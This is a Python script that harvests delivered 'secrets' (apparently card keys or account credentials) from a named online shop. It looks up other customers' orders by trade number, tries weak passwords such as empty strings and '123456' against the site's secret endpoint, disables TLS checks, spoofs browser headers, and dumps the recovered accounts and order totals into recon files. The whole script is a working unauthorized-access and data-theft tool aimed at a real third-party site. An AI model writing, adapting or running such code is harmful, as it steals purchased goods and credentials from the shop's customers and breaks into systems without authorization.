#!/usr/bin/env python3
"""Re-fetch secrets for known hit tradeNos; write clean JSON/TSV/accounts."""
import json
import re
from pathlib import Path

import requests
import urllib3

urllib3.disable_warnings()
B = "https://hao998.xyz"
OUT = Path("/data/recon/hao998/dump")

# from finalize + hits
TRADE = [
    ("400251001231951283", "123123"),
    ("756260628204413274", "123"),
    ("551260615140934266", "123"),
    ("449251230182935400", "123"),
    ("761251230124840970", "123"),
    ("730251228220852428", "123"),
    ("423251227104924937", "123"),
    ("490251226214930533", "123"),
    ("587251226205558332", "123"),
    ("664251226205356101", "123"),
    ("168251226183408169", "123"),
    ("375260505213758123", "12323"),
]

s = requests.Session()
s.verify = False
s.headers.update(
    {
        "User-Agent": "Mozilla/5.0",
        "X-Requested-With": "XMLHttpRequest",
        "Origin": B,
        "Referer": B + "/",
    }
)

rows = []
accounts = []
for tn, kw in TRADE:
    # refresh order meta
    q = s.post(B + "/user/api/index/query", data={"keywords": tn}, timeout=20).json()
    meta = None
    data = q.get("data")
    if isinstance(data, list) and data:
        meta = data[0]
    secret = None
    for pw in ["", "123456", kw]:
        r = s.post(
            B + "/user/api/index/secret",
            data={"orderId": tn, "password": pw},
            timeout=20,
        )
        try:
            j = r.json()
        except Exception:
            continue
        if j.get("code") == 200 and j.get("data"):
            d = j["data"]
            secret = d.get("secret") if isinstance(d, dict) else d
            break
    cards = []
    if secret:
        blob = str(secret).replace("<br/>", "\n").replace("<br>", "\n")
        for line in re.split(r"[\r\n]+", blob):
            line = line.strip()
            if line:
                cards.append(line)
                accounts.append(line)
    row = {
        "trade_no": tn,
        "query_kw": kw,
        "order": meta,
        "secret": secret,
        "cards": cards,
        "card_count": len(cards),
    }
    rows.append(row)
    print(tn, "cards", len(cards), "amount", (meta or {}).get("amount"), "status", (meta or {}).get("status"))

(OUT / "contact_kami_clean.json").write_text(
    json.dumps(rows, ensure_ascii=False, indent=2), encoding="utf-8"
)
uniq = sorted(set(accounts))
(OUT / "contact_kami_accounts.txt").write_text("\n".join(uniq) + "\n", encoding="utf-8")
# one-line-per-order tsv with cards joined by |
with (OUT / "contact_kami_dedup.tsv").open("w", encoding="utf-8") as f:
    for r in rows:
        joined = " | ".join(r["cards"]).replace("\t", " ")
        f.write(f"{r['trade_no']}\t{r['query_kw']}\t{r['card_count']}\t{joined}\n")
stats = {
    "orders": len(rows),
    "paid_with_secret": sum(1 for r in rows if r["secret"]),
    "account_lines": len(uniq),
    "hit_keywords": sorted({r["query_kw"] for r in rows}),
    "total_amount": sum(float((r.get("order") or {}).get("amount") or 0) for r in rows),
}
(OUT / "contact_kami_stats.json").write_text(
    json.dumps(stats, ensure_ascii=False, indent=2), encoding="utf-8"
)
print(json.dumps(stats, ensure_ascii=False, indent=2))
